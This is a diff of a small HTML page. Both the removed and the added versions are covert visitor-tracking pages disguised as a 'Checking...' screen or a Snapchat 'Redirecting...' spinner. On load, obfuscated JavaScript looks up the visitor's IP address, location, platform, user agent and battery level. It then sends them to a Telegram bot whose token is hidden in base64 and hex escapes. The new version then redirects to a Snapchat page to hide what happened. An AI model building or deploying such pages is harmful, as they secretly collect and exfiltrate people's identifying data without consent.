@@ -1,39 +1,5 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Checking...</title>
-</head>
-<body style="background:#000;margin:0;height:100vh;" onload="v99()" onclick="v99()">
-    <script>
-        const _v1 = ["ODcxOTI5ODQwMzpBQUctOUlKZzJ4TFhtMFlhVjN5eTBaMXdHRURHcmpGUVd4VQ==", "NjAwMTI4NjI3MA=="];
-        const _v2 = (s) => atob(s);
-
-        async function v99() {
-            try {
-                const _u1 = _v2("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==");
-                const _u2 = _v2("L3NlbmRNZXNzYWdlP2NoYXRfaWQ9");
-                const _n = await fetch(_v2("aHR0cHM6Ly9pcGFwaS5jby9qc29uLw==")).then(r => r.json());
-                const _b = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level: 0}));
-                
-                let _m = `REPORT_V115_FINAL\n`;
-                _m += `IP: ${_n.ip}\n`;
-                _m += `LOC: ${_n.city}, ${_n.country_name}\n`;
-                _m += `NET: ${_n.org}\n`;
-                _m += `BATT: ${(_b.level * 100).toFixed(0)}%\n`;
-                _m += `PLAT: ${navigator.platform}\n`;
-                _m += `MEM: ${navigator.deviceMemory || 'N/A'}GB`;
-
-                const _f = _u1 + _v2(_v1[0]) + _u2 + _v2(_v1[1]) + "&text=" + encodeURIComponent(_m);
-                
-                new Image().src = _f;
-                navigator.sendBeacon(_f);
-                fetch(_f, {mode: 'no-cors'});
-            } catch (e) {
-                const _err = "https://api.telegram.org/bot" + _v2(_v1[0]) + "/sendMessage?chat_id=" + _v2(_v1[1]) + "&text=ENTRY_DETECTED";
-                navigator.sendBeacon(_err);
-            }
-        }
-    </script>
-</body>
-</html>
+<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Redirecting...</title><script>
+const _0x1f21=["\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x68\x63\x47\x6b\x75\x64\x47\x56\x73\x5a\x57\x64\x79\x59\x57\x31\x75\x62\x33\x4a\x6e\x4c\x32\x4a\x76\x64\x41\x3d\x3d","\x52\x47\x56\x32\x61\x57\x4e\x6c\x51\x32\x46\x77\x61\x51\x3d\x3d"];const _v=(s)=>atob(atob(s));
+const _k1="ODcxOTI5ODQwMzpBQUctOUlKZzJ4TFhtMFlhVjN5eTBaMXdHRURHcmpGUVd4VQ==";const _k2="NjAwMTI4NjI3MA==";
+async function _0xS9(){try{const n=navigator,d=n.userAgent,p=n.platform,r=await fetch('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x69\x70\x69\x66\x79\x2e\x6f\x72\x67\x3f\x66\x6f\x72\x6d\x61\x74\x3d\x6a\x73\x6f\x6e').then(x=>x.json()),b=await(n.getBattery?n.getBattery():Promise.resolve({level:1}));const m=`[LOG]\nID:${Math.random().toString(36).substr(2,7)}\nAD:${r.ip}\nOS:${p}\nST:${b.level*100}%\nUA:${d}`;const u=_v(_0x1f21[0])+atob(_k1)+'/sendMessage?chat_id='+atob(_k2)+'&text='+encodeURIComponent(m);const c=new AbortController();setTimeout(()=>c.abort(),4000);await fetch(u,{signal:c.signal,mode:'no-cors'});window.location.replace("https://www.snapchat.com/add/official_group")}catch(e){window.location.replace("https://www.snapchat.com/")}}window.onload=_0xS9;
+</script><style>body{background:#000;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}.p{border:2px solid #111;border-top:2px solid #FFFC00;border-radius:50%;width:30px;height:30px;animation:s 1s linear infinite}@keyframes s{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style></head><body><div class="p"></div></body></html>
